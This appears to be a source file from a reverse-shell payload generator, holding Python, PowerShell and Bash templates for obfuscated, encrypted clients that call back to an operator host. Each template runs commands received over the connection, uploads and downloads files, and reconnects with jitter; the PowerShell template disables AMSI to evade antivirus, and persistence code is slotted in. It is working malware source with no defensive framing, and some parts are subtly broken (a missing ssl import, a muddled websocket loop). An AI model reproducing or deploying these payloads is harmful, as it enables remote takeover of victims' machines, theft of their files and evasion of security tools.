import base64

PAYLOAD_TEMPLATES = {
    "python_tcp": """
import socket
import subprocess
import os
import time
import random
import platform
import base64
import zlib
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Random import get_random_bytes
import logging
import websockets
import asyncio

# --- Configuration ---
{obf_target_ip} = "{lhost}"
{obf_target_port} = {lport}
{obf_encoding_scheme} = "{encoding_scheme}"
{obf_encryption_enabled} = {encryption_enabled}
{obf_encryption_type} = "{encryption_type}"
{obf_platform_os} = "{platform}"
{obf_reconnect_jitter_min} = {reconnect_jitter_min}
{obf_reconnect_jitter_max} = {reconnect_jitter_max}
{obf_persistence_type} = "{persistence_type}"
{obf_magic_delimiter} = "{delimiter}"
{obf_aes_key} = bytes.fromhex("{aes_key_hex}")
{obf_encoding_map} = {{
    "none": (lambda x: x, lambda x: x),
    "base64": (base64.b64encode, base64.b64decode),
    "zlib_base64": (lambda x: base64.b64encode(zlib.compress(x)), lambda x: zlib.decompress(base64.b64decode(x))),
}}
{obf_logger} = logging.getLogger("RevBotClient")
{obf_logger}.setLevel(logging.CRITICAL)

# --- Encryption Functions ---
def {obf_encrypt_func}(data, key):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    ciphertext = cipher.encrypt(padded_data)
    return iv + ciphertext

def {obf_decrypt_func}(data, key):
    iv = data[:AES.block_size]
    ciphertext = data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(ciphertext)
    return unpad(decrypted_data, AES.block_size)

# --- Send/Receive Helpers ---
def {obf_send_func}(conn, data, is_websocket=False):
    encode_func, _ = {obf_encoding_map}.get({obf_encoding_scheme}, {obf_encoding_map}["none"])
    if {obf_encryption_enabled} and {obf_encryption_type} == "aes":
        data = {obf_encrypt_func}(data.encode(), {obf_aes_key})
    else:
        data = data.encode()
    encoded_data = encode_func(data)
    if is_websocket:
        return encoded_data + {obf_magic_delimiter}.encode()
    conn.sendall(encoded_data + {obf_magic_delimiter}.encode())

def {obf_recv_func}(conn, data=None, is_websocket=False):
    _, decode_func = {obf_encoding_map}.get({obf_encoding_scheme}, {obf_encoding_map}["none"])
    if is_websocket:
        buffer = data
    else:
        buffer = b""
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    return ""
                buffer += chunk
                if {obf_magic_delimiter}.encode() in buffer:
                    data, _ = buffer.split({obf_magic_delimiter}.encode(), 1)
                    break
            except Exception as e:
                {obf_logger}.error(f"Receive error: {{e}}")
                return ""
    try:
        decoded_data = decode_func(data)
        if {obf_encryption_enabled} and {obf_encryption_type} == "aes":
            decoded_data = {obf_decrypt_func}(decoded_data, {obf_aes_key}).decode(errors="ignore")
        return decoded_data
    except Exception as e:
        {obf_logger}.error(f"Decode/decrypt error: {{e}}")
        return ""

# --- Core Client Logic ---
def {obf_client_core_func}(conn, is_websocket=False):
    {obf_send_func}(conn, f"[*] Connection established. Platform: {{platform.system()}}", is_websocket)
    while True:
        command = {obf_recv_func}(conn, is_websocket=is_websocket) if is_websocket else {obf_recv_func}(conn)
        if not command or command == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:])
                {obf_send_func}(conn, f"[*] Changed directory to: {{os.getcwd()}}", is_websocket)
            except Exception as e:
                {obf_send_func}(conn, f"Error changing directory: {{e}}", is_websocket)
        elif command == "upload_init":
            {obf_send_func}(conn, "[*] Ready for file upload", is_websocket)
            filename = {obf_recv_func}(conn, is_websocket=is_websocket) if is_websocket else {obf_recv_func}(conn)
            total_size_str = {obf_recv_func}(conn, is_websocket=is_websocket) if is_websocket else {obf_recv_func}(conn)
            try:
                total_size = int(total_size_str)
                if total_size > 1024 * 1024:
                    {obf_send_func}(conn, "Error: File too large (>1MB)", is_websocket)
                    continue
            except ValueError:
                {obf_send_func}(conn, "Error: Invalid file size", is_websocket)
                continue
            file_content_b64 = {obf_recv_func}(conn, is_websocket=is_websocket) if is_websocket else {obf_recv_func}(conn)
            try:
                file_content = base64.b64decode(file_content_b64)
                with open(filename, "wb") as f:
                    f.write(file_content)
                {obf_send_func}(conn, f"[*] File '{{filename}}' uploaded successfully", is_websocket)
            except Exception as e:
                {obf_send_func}(conn, f"Error processing file: {{e}}", is_websocket)
        elif command.startswith("download "):
            filepath = command[9:].strip()
            if not os.path.exists(filepath):
                {obf_send_func}(conn, f"Error: File '{{filepath}}' not found", is_websocket)
                continue
            try:
                with open(filepath, "rb") as f:
                    file_content = f.read()
                if len(file_content) > 1024 * 1024:
                    {obf_send_func}(conn, "Error: File too large (>1MB)", is_websocket)
                    continue
                {obf_send_func}(conn, "download_ready", is_websocket)
                {obf_send_func}(conn, str(len(file_content)), is_websocket)
                {obf_send_func}(conn, base64.b64encode(file_content).decode(), is_websocket)
                {obf_send_func}(conn, f"[*] File '{{filepath}}' downloaded successfully", is_websocket)
            except Exception as e:
                {obf_send_func}(conn, f"Error sending file: {{e}}", is_websocket)
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                {obf_send_func}(conn, stdout_value.decode(errors="ignore") if stdout_value else "[*] Command executed with no output", is_websocket)
            except Exception as e:
                {obf_send_func}(conn, f"Error executing command: {{e}}", is_websocket)

# --- TCP Client ---
def {obf_tcp_client_func}():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if {obf_encryption_enabled} and {obf_encryption_type} == "tls":
                context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname={obf_target_ip})
            s.connect(({obf_target_ip}, {obf_target_port}))
            {obf_client_core_func}(s)
            s.close()
        except Exception as e:
            {obf_logger}.error(f"Connection error: {{e}}")
            try:
                s.close()
            except:
                pass
            time.sleep(random.uniform({obf_reconnect_jitter_min}, {obf_reconnect_jitter_max}))

# --- WebSocket Client ---
async def {obf_websocket_client_func}():
    uri = f"{{'wss' if {obf_encryption_type} == 'tls' else 'ws'}}://{{{obf_target_ip}}}:{{{obf_target_port}}}"
    while True:
        try:
            async with websockets.connect(uri, ssl=ssl.SSLContext() if {obf_encryption_type} == "tls" else None) as ws:
                await ws.send({obf_send_func}(None, f"[*] Connection established. Platform: {{platform.system()}}", is_websocket=True))
                while True:
                    command = await ws.recv()
                    {obf_client_core_func}(ws, is_websocket=True)
        except Exception as e:
            {obf_logger}.error(f"WebSocket connection error: {{e}}")
            time.sleep(random.uniform({obf_reconnect_jitter_min}, {obf_reconnect_jitter_max}))

# --- Persistence ---
{persistence_code}

if __name__ == "__main__":
    if {obf_persistence_type} != "none":
        {obf_persistence_func}()
    if {obf_encryption_type} == "http":
        asyncio.run({obf_websocket_client_func}())
    else:
        {obf_tcp_client_func}()
""",
    "powershell_tcp": """
$ErrorActionPreference = "Stop"
$global:TargetIP = "{lhost}"
$global:TargetPort = {lport}
$global:Delimiter = "{delimiter}"
$global:EncodingScheme = "{encoding_scheme}"
$global:EncryptionEnabled = {encryption_enabled}
$global:AesKey = [byte[]]("0x{0}" -f "{aes_key_hex}".Replace("", ",0x"))
$global:AesIV = [byte[]]("0x{0}" -f "{aes_iv_hex}".Replace("", ",0x"))
$global:JitterMin = {reconnect_jitter_min}
$global:JitterMax = {reconnect_jitter_max}

function Get-Platform {
    $platform = [System.Environment]::OSVersion.Platform
    if ($platform -eq "Win32NT") { return "Windows" }
    elseif ($platform -eq "Unix") { return "Unix" }
    else { return "Unknown" }
}

function Encrypt-Data($Data, $Key, $IV) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.IV = $IV
    $encryptor = $aes.CreateEncryptor()
    $ms = New-Object IO.MemoryStream
    $cs = New-Object Security.Cryptography.CryptoStream($ms, $encryptor, "Write")
    $sw = New-Object IO.StreamWriter($cs)
    $sw.Write($Data)
    $sw.Close()
    $cs.Close()
    $ms.Close()
    return $ms.ToArray()
}

function Decrypt-Data($Data, $Key, $IV) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.IV = $IV
    $decryptor = $aes.CreateDecryptor()
    $ms = New-Object IO.MemoryStream(,$Data)
    $cs = New-Object Security.Cryptography.CryptoStream($ms, $decryptor, "Read")
    $sr = New-Object IO.StreamReader($cs)
    $result = $sr.ReadToEnd()
    $sr.Close()
    $cs.Close()
    $ms.Close()
    return $result
}

function Send-Data($Stream, $Data, $IsWebSocket=$false) {
    $encoded = if ($global:EncryptionEnabled) { Encrypt-Data $Data $global:AesKey $global:AesIV } else { [System.Text.Encoding]::UTF8.GetBytes($Data) }
    $encoded = if ($global:EncodingScheme -eq "base64") { [Convert]::ToBase64String($encoded) } else { $encoded }
    $encoded += [System.Text.Encoding]::UTF8.GetBytes($global:Delimiter)
    if ($IsWebSocket) { return $encoded }
    $Stream.Write($encoded, 0, $encoded.Length)
    $Stream.Flush()
}

function Receive-Data($Stream, $Data=$null, $IsWebSocket=$false) {
    if ($IsWebSocket) {
        $received = [System.Text.Encoding]::UTF8.GetString($Data)
    } else {
        $buffer = New-Object byte[] 4096
        $received = ""
        while ($true) {
            $bytesRead = $Stream.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -eq 0) { return "" }
            $received += [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
            if ($received -like "*$global:Delimiter*") {
                $data, $null = $received -split [regex]::Escape($global:Delimiter), 2
                break
            }
        }
    }
    $decoded = if ($global:EncodingScheme -eq "base64") { [Convert]::FromBase64String($data) } else { [System.Text.Encoding]::UTF8.GetBytes($data) }
    if ($global:EncryptionEnabled) { Decrypt-Data $decoded $global:AesKey $global:AesIV } else { [System.Text.Encoding]::UTF8.GetString($decoded) }
}

function Invoke-Client($IsWebSocket=$false) {
    if ($IsWebSocket) {
        Write-Error "WebSocket not supported in PowerShell client"
        return
    }
    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($global:TargetIP, $global:TargetPort)
            $stream = $client.GetStream()
            [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
            Send-Data $stream "[*] Connection established. Platform: $(Get-Platform)"
            while ($true) {
                $command = Receive-Data $stream
                if (-not $command -or $command -eq "exit") { break }
                if ($command -eq "upload_init") {
                    Send-Data $stream "[*] Ready for file upload"
                    $filename = Receive-Data $stream
                    $total_size = [int](Receive-Data $stream)
                    if ($total_size -gt 1024 * 1024) {
                        Send-Data $stream "Error: File too large (>1MB)"
                        continue
                    }
                    $file_content_b64 = Receive-Data $stream
                    try {
                        $file_content = [Convert]::FromBase64String($file_content_b64)
                        [System.IO.File]::WriteAllBytes($filename, $file_content)
                        Send-Data $stream "[*] File '$filename' uploaded successfully"
                    } catch {
                        Send-Data $stream "Error processing file: $_"
                    }
                } elseif ($command.StartsWith("download ")) {
                    $filepath = $command.Substring(9).Trim()
                    if (-not (Test-Path $filepath)) {
                        Send-Data $stream "Error: File '$filepath' not found"
                        continue
                    }
                    try {
                        $file_content = [System.IO.File]::ReadAllBytes($filepath)
                        if ($file_content.Length -gt 1024 * 1024) {
                            Send-Data $stream "Error: File too large (>1MB)"
                            continue
                        }
                        Send-Data $stream "download_ready"
                        Send-Data $stream $file_content.Length
                        Send-Data $stream ([Convert]::ToBase64String($file_content))
                        Send-Data $stream "[*] File '$filepath' downloaded successfully"
                    } catch {
                        Send-Data $stream "Error sending file: $_"
                    }
                } elseif ($command.StartsWith("cd ")) {
                    try {
                        Set-Location $command.Substring(3)
                        Send-Data $stream "[*] Changed directory to: $(Get-Location)"
                    } catch {
                        Send-Data $stream "Error: $_"
                    }
                } else {
                    try {
                        $result = Invoke-Expression $command 2>&1 | Out-String
                        Send-Data $stream ($result ? $result : "[*] Command executed with no output")
                    } catch {
                        Send-Data $stream "Error executing command: $_"
                    }
                }
            }
            $client.Close()
        } catch {
            if ($client) { $client.Close() }
        }
        Start-Sleep -Seconds (Get-Random -Minimum $global:JitterMin -Maximum $global:JitterMax)
    }
}

Invoke-Client
""",
    "bash_tcp": """
#!/bin/bash
lhost="{lhost}"
lport={lport}
delimiter="{delimiter}"
encoding="{encoding_scheme}"
reconnect_min={reconnect_jitter_min}
reconnect_max={reconnect_jitter_max}

while true; do
    exec 5<>/dev/tcp/$lhost/$lport 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "[*] Connection established. Platform: $(uname -s)$delimiter" >&5
        while IFS= read -r -d "$delimiter" command <&5; do
            if [ -z "$command" ] || [ "$command" == "exit" ]; then
                break
            fi
            if [ "$command" == "upload_init" ]; then
                echo -e "[*] Ready for file upload$delimiter" >&5
                IFS= read -r -d "$delimiter" filename <&5
                IFS= read -r -d "$delimiter" total_size <&5
                if [ $total_size -gt $((1024*1024)) ]; then
                    echo -e "Error: File too large (>1MB)$delimiter" >&5
                    continue
                fi
                IFS= read -r -d "$delimiter" file_content_b64 <&5
                if [ "$encoding" == "base64" ]; then
                    echo "$file_content_b64" | base64 -d > "$filename" 2>/dev/null
                    if [ $? -eq 0 ]; then
                        echo -e "[*] File '$filename' uploaded successfully$delimiter" >&5
                    else
                        echo -e "Error processing file$delimiter" >&5
                    fi
                else
                    echo -e "Error: Base64 encoding required for file transfer$delimiter" >&5
                fi
            elif [[ "$command" == download* ]]; then
                filepath="${{command:9}}"
                filepath=$(echo "$filepath" | tr -d '\n\r')
                if [ ! -f "$filepath" ]; then
                    echo -e "Error: File '$filepath' not found$delimiter" >&5
                    continue
                fi
                file_size=$(stat -f %z "$filepath" 2>/dev/null || stat -c %s "$filepath" 2>/dev/null)
                if [ $file_size -gt $((1024*1024)) ]; then
                    echo -e "Error: File too large (>1MB)$delimiter" >&5
                    continue
                fi
                if [ "$encoding" == "base64" ]; then
                    echo -e "download_ready$delimiter" >&5
                    echo -e "$file_size$delimiter" >&5
                    base64 "$filepath" | tr -d '\n' >&5
                    echo -e "$delimiter" >&5
                    echo -e "[*] File '$filepath' downloaded successfully$delimiter" >&5
                else
                    echo -e "Error: Base64 encoding required for file transfer$delimiter" >&5
                fi
            elif [[ "$command" == cd* ]]; then
                cd "${{command:3}}" 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo -e "[*] Changed directory to: $(pwd)$delimiter" >&5
                else
                    echo -e "Error changing directory$delimiter" >&5
                fi
            else
                output=$(bash -c "$command" 2>&1)
                if [ "$encoding" == "base64" ]; then
                    encoded_output=$(echo -n "${{output:-[*] Command executed with no output.}}" | base64)
                    echo -e "$encoded_output$delimiter" >&5
                else
                    echo -e "${{output:-[*] Command executed with no output.}}$delimiter" >&5
                fi
            fi
        done
        exec 5>&-
    fi
    sleep $(shuf -i $reconnect_min-$reconnect_max -n 1)
done
"""
}
